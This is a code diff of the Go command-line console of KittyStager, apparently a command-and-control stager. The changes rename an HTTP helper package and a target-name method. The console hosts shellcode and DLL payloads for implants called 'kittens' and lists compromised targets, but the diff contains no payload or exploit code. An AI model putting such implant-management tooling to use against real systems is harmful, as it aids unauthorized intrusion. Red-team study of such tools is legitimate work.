@@ -2,7 +2,7 @@ package cli
 
 import (
 	"KittyStager/cmd/config"
-	"KittyStager/cmd/httpUtil"
+	"KittyStager/cmd/http"
 	"KittyStager/cmd/util"
 	"fmt"
 	i "github.com/JoaoDanielRufino/go-input-autocomplete"
@@ -31,9 +31,9 @@ func payload(kittenName string) {
 			util.ErrPrint(err)
 			return
 		}
-		err = httpUtil.HostDll(path, function, kittenName)
+		err = http.HostDll(path, function, kittenName)
 	} else {
-		err = httpUtil.HostShellcode(path, kittenName)
+		err = http.HostShellcode(path, kittenName)
 	}
 	if err != nil {
 		util.ErrPrint(err)
@@ -51,7 +51,7 @@ func sleep(in []string, kittenName string) {
 		util.ErrPrint(err)
 		return
 	}
-	err = httpUtil.HostSleep(time, kittenName)
+	err = http.HostSleep(time, kittenName)
 	if err != nil {
 		return
 	}
@@ -59,14 +59,14 @@ func sleep(in []string, kittenName string) {
 
 func interact() {
 	printTarget()
-	if len(httpUtil.Targets) == 0 {
+	if len(http.Targets) == 0 {
 		fmt.Println(color.Red("No targets"))
 		return
 	}
 	//diretly interact with a target
-	if len(httpUtil.Targets) == 1 {
-		for _, v := range httpUtil.Targets {
-			err := Interact(v.GetTarget())
+	if len(http.Targets) == 1 {
+		for _, v := range http.Targets {
+			err := Interact(v.GetName())
 			if err != nil {
 				return
 			}
@@ -89,16 +89,16 @@ func interact() {
 		util.ErrPrint(err)
 		return
 	}
-	if _, ok := httpUtil.Targets[kittenName]; !ok {
+	if _, ok := http.Targets[kittenName]; !ok {
 		util.ErrPrint(fmt.Errorf("invalid id"))
 		return
 	}
-	if !httpUtil.Targets[kittenName].GetAlive() {
+	if !http.Targets[kittenName].GetAlive() {
 		util.ErrPrint(fmt.Errorf("this kitten is dead"))
 		return
 	}
 	fmt.Println()
-	err = Interact(httpUtil.Targets[kittenName].GetTarget())
+	err = Interact(http.Targets[kittenName].GetName())
 	if err != nil {
 		util.ErrPrint(err)
 		return
@@ -110,7 +110,7 @@ func printTarget() {
 	fmt.Printf("%s\n", color.Green("Id:\tKitten name:\tIp:\t\tHostname:\t\tLast seen:\tSleep:\tAlive:"))
 	fmt.Printf("%s\n", color.Green("═══\t════════════\t═══\t\t═════════\t\t══════════\t══════\t══════"))
 
-	for name, x := range httpUtil.Targets {
+	for name, x := range http.Targets {
 		var e string
 		if x.GetAlive() {
 			e = "Yes"
@@ -140,9 +140,9 @@ func printTarget() {
 }
 
 func findId(id int) (string, error) {
-	for _, x := range httpUtil.Targets {
+	for _, x := range http.Targets {
 		if x.GetId() == id {
-			return x.GetTarget(), nil
+			return x.GetName(), nil
 		}
 	}
 	return "", fmt.Errorf("invalid id")
